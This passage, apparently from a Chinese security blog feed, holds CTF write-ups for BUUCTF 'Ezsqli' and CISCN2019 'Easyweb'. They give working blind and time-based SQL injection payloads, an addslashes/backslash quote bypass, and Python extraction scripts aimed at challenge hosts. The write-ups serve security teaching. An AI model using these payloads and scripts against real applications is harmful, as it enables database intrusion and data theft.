&#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+0%2C1)%2C1%2C1))&gt;102+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://aca6d848-9ae8-4a23-8abd-cfbb6e52885c.node5.buuoj.cn:81/index.php&#x27;</span><br><span class="hljs-comment"># table_len存储每张表的长度</span><br>table_len = [<span class="hljs-number">80</span>]<br><span class="hljs-comment"># table_name存储每张表的名字</span><br>table_name = []<br><span class="hljs-comment"># index存储现在处理的是第index+1张表</span><br>index = <span class="hljs-number">0</span><br><span class="hljs-comment"># 由于获取的是所有表名总字符串，所以只要遍历一次即可</span><br><span class="hljs-keyword">while</span> (index &lt; <span class="hljs-number">1</span>):<br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-comment"># n表示当前处理的表所处理的是第n个字符</span><br>    n = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (n &lt;= table_len[index]):<br>        <span class="hljs-comment"># 从可打印字符开始</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 对第n个字符进行判断</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>            <span class="hljs-comment"># payload1:用于普通盲注</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(index, n, tmp)</span><br>            payload = <span class="hljs-string">&quot;1^(ascii(substr((select(GROUP_CONCAT(TABLE_NAME))from(sys.schema_table_statistics_with_buffer)where(TABLE_SCHEMA=database())),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>            <span class="hljs-built_in">print</span>(payload)<br>            data = &#123;<br>                <span class="hljs-string">&quot;id&quot;</span>: payload<br>            &#125;<br>            <span class="hljs-comment"># print(begin,end,tmp)</span><br>            <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>            <span class="hljs-comment"># print(url + payload2)</span><br>            <span class="hljs-comment"># r = requests.get(url + payload2, )</span><br>            r = requests.post(url=url, data=data)<br>            <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>            true_text = <span class="hljs-string">&quot;Occured&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># 返回true界面 </span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 返回flase界面</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>        name = name + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># 继续下一个字符</span><br>        n = n + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 存储该表的表名</span><br>    table_name.append(name)<br>    <span class="hljs-comment"># 打印该表的表名</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第&#123;&#125;张表的名字为&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(index+<span class="hljs-number">1</span>, name))<br>    <span class="hljs-comment"># 继续下一个表</span><br>    index = index + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(table_name)<br></code></pre></td></tr></table></figure><p>输出:</p><p><img src="/images/2024-2-3-Ezsqli/image-20240130222124116.png" alt="image-20240130222124116"></p><p>数据表名:users233333333333333,f1ag_1s_h3r3_hhhhh</p><h2 id="无列名注入法"><a href="#无列名注入法" class="headerlink" title="无列名注入法:"></a>无列名注入法:</h2><p>由于网页过滤了information_schema，同时sys.schema_table_statistics_with_buffer不存储列名，所以我们无法获取数据库的列名，所以只能采用无列名的方式进行注入:</p><h3 id="本地数据库测试"><a href="#本地数据库测试" class="headerlink" title="本地数据库测试:"></a>本地数据库测试:</h3><h4 id="flag数据表"><a href="#flag数据表" class="headerlink" title="flag数据表:"></a>flag数据表:</h4><p><img src="/images/2024-2-3-Ezsqli/image-20240130224759763.png" alt="image-20240130224759763"></p><h5 id="sql语句"><a href="#sql语句" class="headerlink" title="sql语句:"></a>sql语句:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select * from flag<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-Ezsqli/image-20240130224852251.png" alt="image-20240130224852251"></p><h4 id="mysql的元组比较法"><a href="#mysql的元组比较法" class="headerlink" title="mysql的元组比较法:"></a>mysql的元组比较法:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">select (100,&#x27;g&#x27;)&gt;(select * from flag)<br>元组比较法要求&gt;左右两边的元素数量一致，即(100,&#x27;a&#x27;)为两个元素100和&#x27;a&#x27;,则(select * from flag)查询出来的结果集的字段数量也要为两个，不然就会报错<br></code></pre></td></tr></table></figure><h5 id="报错情况"><a href="#报错情况" class="headerlink" title="报错情况:"></a>报错情况:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select (100,&#x27;g&#x27;,&#x27;a&#x27;)&gt;(select * from flag)<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-Ezsqli/image-20240130225250981.png" alt="image-20240130225250981"></p><p>它会要求&gt;后面的操作语句至少查询出三个字段</p><h5 id="比较方式"><a href="#比较方式" class="headerlink" title="比较方式:"></a>比较方式:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">select (100,&#x27;g&#x27;)&gt;(select * from flag)<br>它会先将(100,&#x27;g&#x27;)的第一个元素和(select * from flag)的第一个字段元素进行比较，如果是数值型则直接比较数值大小，如果100大于(select * from flag)的第一个字段元素，则直接返回true，即1<br><br>如果100等于(select * from flag)的第一个字段元素则继续比较(100,&#x27;g&#x27;)的第二个元素&#x27;g&#x27;与(select * from flag)的第二个字段元素的大小，字符串的大小比较和c语言的strcmp()相似，从字符串的头一个字符开始比较，如果前面的字符串的第一个字符大于后一个字符串的第一个字符则返回1，小于则直接返回0，相等继续比较第一个字符串的第二个字符和第二个字符串的第二个字符，以此类推，直到最后一个字符<br><br>如果100小于(select * from flag)的第一个字段元素则直接返回false,即0<br></code></pre></td></tr></table></figure><p>了解了mysql的元组比较法，我们知道我们需要清楚表的字段个数，使用payload进行测试</p><h3 id="构造payload获取表字段数"><a href="#构造payload获取表字段数" class="headerlink" title="构造payload获取表字段数:"></a>构造payload获取表字段数:</h3><p>payload1:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">id=1^(select (100)&gt;(select * from f1ag_1s_h3r3_hhhhh))<br></code></pre></td></tr></table></figure><p><img src="/2024/02/03/2024-2-3-Ezsqli/Typora_images\image-20240130230708594.png" alt="image-20240130230708594"></p><p>返回错误，即没有返回0或1的两种响应信息，说明sql语句发生报错，所以字段数不是1</p><p>payload2:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">id=1^(select (100,111)&gt;(select * from f1ag_1s_h3r3_hhhhh))<br></code></pre></td></tr></table></figure><p><img src="/2024/02/03/2024-2-3-Ezsqli/Typora_images\image-20240130230831104.png" alt="image-20240130230831104"></p><p>返回0时的页面信息，所以可以证明f1ag_1s_h3r3_hhhhh表的字段数为2,接下来就要确定f1ag_1s_h3r3_hhhhh表的第一个字段的值为多少</p><h3 id="构造payload证明f1ag-1s-h3r3-hhhhh表第一个字段不是以flag-开头："><a href="#构造payload证明f1ag-1s-h3r3-hhhhh表第一个字段不是以flag-开头：" class="headerlink" title="构造payload证明f1ag_1s_h3r3_hhhhh表第一个字段不是以flag{开头："></a>构造payload证明f1ag_1s_h3r3_hhhhh表第一个字段不是以flag{开头：</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">id=1^(select (&#x27;flag&#123;&#x27;,1)&gt;(select * from f1ag_1s_h3r3_hhhhh))<br></code></pre></td></tr></table></figure><p>因为flag都已flag{xxxxx}的形式存在，所以如果第一个字段为flag{xxxx}，则该payload应该返回1^0:<br><img src="/2024/02/03/2024-2-3-Ezsqli/Typora_images\image-20240130232051526.png" alt="image-20240130232051526"></p><p>返回的是1^0的情况，所以可以说明第一个字段不是flag所在字段，这里如果返回的是1^1的情况时，可能还需要考虑更多的情况，因为如果第一个字段的值确实比flag{大如g666,则就无法确定flag所在字段了，但返回1^0,则可以说明flag绝对不在第一个字段，一般来说，数据库表的第一个字段都是id,所以我们可以直接猜第一个字段的值为0，1，2，3，4，5……..,一般id都从1开始</p><h3 id="构造最终payload："><a href="#构造最终payload：" class="headerlink" title="构造最终payload："></a>构造最终payload：</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">id=1^(select (1,&#x27;xxxx&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))<br></code></pre></td></tr></table></figure><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本:"></a>脚本:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&#x27;http://9663941a-5bd2-4516-9b2b-8df811ed2df8.node5.buuoj.cn:81/index.php&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    begin = <span class="hljs-number">32</span><br>    end = <span class="hljs-number">128</span><br>    tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> (begin &lt; end):<br>        <span class="hljs-comment"># print(&quot;tmp:&#123;&#125;&quot;.format(tmp))</span><br>        k = flag + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># print(&quot;k:&#123;&#125;&quot;.format(k))</span><br>        <span class="hljs-comment"># 完善payload</span><br>        payload = <span class="hljs-string">&quot;1^((select * from f1ag_1s_h3r3_hhhhh)&gt;(1,&#x27;&#123;&#125;&#x27;))&quot;</span>.<span class="hljs-built_in">format</span>(k)<br>        data = &#123;<span class="hljs-string">&quot;id&quot;</span>: payload&#125;<br>        <span class="hljs-built_in">print</span>(payload)<br>        r = requests.post(url=url, data=data)<br>        time.sleep(<span class="hljs-number">0.3</span>)<br>        <span class="hljs-comment"># 1^1的返回内容，true的情况</span><br>        true_text = <span class="hljs-string">&quot;Occured&quot;</span><br>        <span class="hljs-keyword">if</span> true_text <span class="hljs-keyword">in</span> r.text:<br>            begin = tmp + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 返回flase界面</span><br>            end = tmp     <br>        tmp = (begin + end) // <span class="hljs-number">2</span>    <br>    <span class="hljs-keyword">if</span> tmp == <span class="hljs-number">33</span>:<br>        <span class="hljs-keyword">break</span> <br>    <span class="hljs-comment"># 输出flag</span><br>    flag = flag + <span class="hljs-built_in">chr</span>(tmp-<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;:flag为:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(i, flag))<br><span class="hljs-comment"># 输出完整的flag</span><br><span class="hljs-built_in">print</span>(flag.lower())<br><br></code></pre></td></tr></table></figure><p>输出:</p><p><img src="/images/2024-2-3-Ezsqli/image-20240131005542728.png" alt="image-20240131005542728"></p><p>flag&#x3D;flag{8999877f-b643-40e3-822c-86d8604fd977}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF [CISCN2019 总决赛 Day2 Web1]Easyweb</title>
    <link href="/2024/02/03/2024-2-3-Easyweb%20/"/>
    <url>/2024/02/03/2024-2-3-Easyweb%20/</url>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><h2 id="访问网页的robots-txt"><a href="#访问网页的robots-txt" class="headerlink" title="访问网页的robots.txt:"></a>访问网页的robots.txt:</h2><p><img src="/images/2023-08-20-Easyweb/image-20240130133211639.png" alt="image-20240130133211639"></p><p>发现网页可以访问.php.bak文件，且匹配的文件名为*即所有文件的都可以，所以可以先尝试一下index.php.bak</p><h2 id="访问一下index-php-bak"><a href="#访问一下index-php-bak" class="headerlink" title="访问一下index.php.bak:"></a>访问一下index.php.bak:</h2><p><img src="/images/2023-08-20-Easyweb/image-20240130133405133.png" alt="image-20240130133405133"></p><p>发现不存在该文件，在网页的前端中还存在以下php文件:</p><p><img src="/images/2023-08-20-Easyweb/image-20240130133457309.png" alt="image-20240130133457309"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">image.php<br>user.php<br></code></pre></td></tr></table></figure><h2 id="访问上述文件的-php-bak文件"><a href="#访问上述文件的-php-bak文件" class="headerlink" title="访问上述文件的.php.bak文件:"></a>访问上述文件的.php.bak文件:</h2><p><img src="/images/2023-08-20-Easyweb/image-20240130133601310.png" alt="image-20240130133601310"></p><p>成功获取image.php.bak文件！！！</p><h2 id="对image-php进行代码1审计"><a href="#对image-php进行代码1审计" class="headerlink" title="对image.php进行代码1审计:"></a>对image.php进行代码1审计:</h2><p>image.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><span class="hljs-comment">// GET请求方式获取id,如果id为空则自动赋值为1</span><br><span class="hljs-variable">$id</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>]:<span class="hljs-string">&quot;1&quot;</span>;<br><span class="hljs-comment">// GET请求方式获取path变量的值，如果没有则自动赋值为空</span><br><span class="hljs-variable">$path</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>]:<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-comment">// 在用书输入的内容中的特殊字符前面加反斜杠，用户减少安全隐患</span><br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$path</span>);<br><span class="hljs-comment">// 将被添加的反斜杠的所有特殊字符进行过滤</span><br><span class="hljs-comment">// 特殊字符:null,&#x27;,&quot;,\</span><br><span class="hljs-comment">// 替换的内容:\0,%00,&#x27;,\&#x27;</span><br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$path</span>);<br><span class="hljs-comment">// sql查询图片路径</span><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-string">&quot;select * from images where id=&#x27;<span class="hljs-subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="hljs-subst">&#123;$path&#125;</span>&#x27;&quot;</span>);<br><span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$result</span>,MYSQLI_ASSOC);<br><span class="hljs-comment">// 获取完整的当前网站下的图片路径</span><br><span class="hljs-variable">$path</span>=<span class="hljs-string">&quot;./&quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;path&quot;</span>];<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: image/jpeg&quot;</span>);<br><span class="hljs-comment">// 读取指定路径的文件内容输出到浏览器中</span><br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$path</span>);<br></code></pre></td></tr></table></figure><h3 id="审计分析"><a href="#审计分析" class="headerlink" title="审计分析:"></a>审计分析:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">通过代码审计，我们可以知道image.php存在sql注入漏洞，注入点有id和path两个<br>-- &#x27;不能使用，但是可以使用#进行注释<br>image.php只返回文件的读取信息，没有对mysql的查询内容以及报错内容进行返回，只能使用盲注的方式，可以直接采用时间盲注<br>由于&#x27;被过滤，而image.php的sql语句采用的是&#x27;进行闭合，所以需要进行绕过<br></code></pre></td></tr></table></figure><h2 id="反斜杠绕过法"><a href="#反斜杠绕过法" class="headerlink" title="反斜杠绕过法:"></a>反斜杠绕过法:</h2><h3 id="使用反斜杠构造sql语句"><a href="#使用反斜杠构造sql语句" class="headerlink" title="使用反斜杠构造sql语句:"></a>使用反斜杠构造sql语句:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs txt">select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;<br>当$id=&#x27;\&#x27;时(进入sql语句中时，&#x27;&#x27;会自动去除)，$path=&#x27;xxx&#x27;<br>sql语句变化=&gt;<br>select * from images where id=&#x27;\&#x27; or path=&#x27;xxx&#x27;<br>由于第二个&#x27;被转义了，就不参与对&#x27;的闭合作用，而是作为一个内容。而第一个&#x27;需要进行闭合，就会向后寻找闭合&#x27;,所以就会将path后面的第一个&#x27;作为闭合对象进行闭合，最终达到的效果就是:<br>id = &#x27;\&#x27; or path=&#x27;<br>而xxx就可以作为我们注入的内容进行sql注入了<br>xxx=&gt;xxx#=&gt;or 1=1 #<br>sql语句变化为<br>=&gt;<br>select * from images where id=&#x27;\&#x27; or path=&#x27; or 1=1 #&#x27;<br><br>id=\<br>&amp;path= or 1=1 #<br></code></pre></td></tr></table></figure><h2 id="由于-被过滤，所以要进行绕过："><a href="#由于-被过滤，所以要进行绕过：" class="headerlink" title="由于\被过滤，所以要进行绕过："></a>由于\被过滤，所以要进行绕过：</h2><h3 id="利用php的替代函数进行双写绕过法"><a href="#利用php的替代函数进行双写绕过法" class="headerlink" title="利用php的替代函数进行双写绕过法:"></a>利用php的替代函数进行双写绕过法:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">$id=addslashes($id);//特殊字符:null,&#x27;,&quot;,\<br>$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$id);<br>可以让id=&#x27;\\0&#x27;<br>=&gt;经过add函数<br>=&gt;\\\0<br>=&gt;经过replace<br>=&gt;\<br></code></pre></td></tr></table></figure><h4 id="测试时间盲注payload"><a href="#测试时间盲注payload" class="headerlink" title="测试时间盲注payload:"></a>测试时间盲注payload:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=\\0&amp;path= or if(1=1,sleep(5),1) #<br>=&gt;有时候需要进行url编码，才能成功<br>?id=\\0&amp;path=%20or%20if(1=1,sleep(5),1)%23<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-20-Easyweb/image-20240130143837533.png" alt="image-20240130143837533"></p><p>使用第二个payload，可以发现网页响应确实延迟了，所以我们可以使用该payload进行时间盲注</p><h2 id="构造时间盲注脚本"><a href="#构造时间盲注脚本" class="headerlink" title="构造时间盲注脚本:"></a>构造时间盲注脚本:</h2><h3 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名:"></a>爆数据库名:</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+length(database())%3D4+%23&amp;Submit=Submit#</span><br><br><span class="hljs-comment"># 测试</span><br><span class="hljs-comment"># payload = 1/**/and/**/if(ascii(substr(database(),1,1))&gt;32,sleep(5),1)#</span><br><br>url = <span class="hljs-string">&#x27;http://3b957018-00b0-4c15-be8e-7990ee9455c2.node5.buuoj.cn:81/image.php?id=&#x27;</span><br>n = <span class="hljs-number">1</span><br><span class="hljs-comment"># 对数据库名字第n个字符进行暴力剖解</span><br><span class="hljs-comment"># payload:1&#x27; and ascii(substr(database(),n,1))&gt;100</span><br>database_name = <span class="hljs-string">&quot;&quot;</span><br>database_lenth = <span class="hljs-number">30</span> <span class="hljs-comment"># 手动规定数据库名字长度</span><br><span class="hljs-keyword">while</span> n &lt;= database_lenth:<br>    <span class="hljs-comment"># 从可打印字符开始</span><br>    begin = <span class="hljs-number">32</span><br>    end = <span class="hljs-number">126</span><br>    tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># 对第n个字符进行判断</span><br>    <span class="hljs-keyword">while</span> (begin &lt; end):<br>        <span class="hljs-comment"># mysql的if(条件,结果1,结果2):条件正确则为结果1，条件为flase为结果2</span><br>        <span class="hljs-comment"># payload = &quot;1/**/and/**/if(ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(5),1)#&quot;.format(n,tmp)</span><br>        payload = <span class="hljs-string">&quot;\\0&amp;path=%20or%20if(ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(3),1)%23&quot;</span>.<span class="hljs-built_in">format</span>(n,tmp)<br>        <span class="hljs-built_in">print</span>(payload)<br>        <span class="hljs-comment"># 开始记时</span><br>        start_time = time.time()<br>        r = requests.get(url+payload)<br>        <span class="hljs-keyword">if</span> (time.time() - start_time &gt; <span class="hljs-number">3</span>):<br>            <span class="hljs-comment"># 返回true界面 </span><br>            begin = tmp + <span class="hljs-number">1</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 返回flase界面</span><br>            end = tmp<br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>    <span class="hljs-comment"># print(tmp)</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该数据库的第%d个字符:%c&quot;</span> % (n, <span class="hljs-built_in">chr</span>(tmp)))<br>    database_name = database_name + <span class="hljs-built_in">chr</span>(tmp)<br>    <span class="hljs-comment"># 对下一个字符进行判断</span><br>    n = n + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该数据库的名字为：&quot;</span>+database_name)<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-20-Easyweb/image-20240130150912831.png" alt="image-20240130150912831"></p><p>爆出数据库名为ciscnfinal</p><h3 id="爆数据库表信息："><a href="#爆数据库表信息：" class="headerlink" title="爆数据库表信息："></a>爆数据库表信息：</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 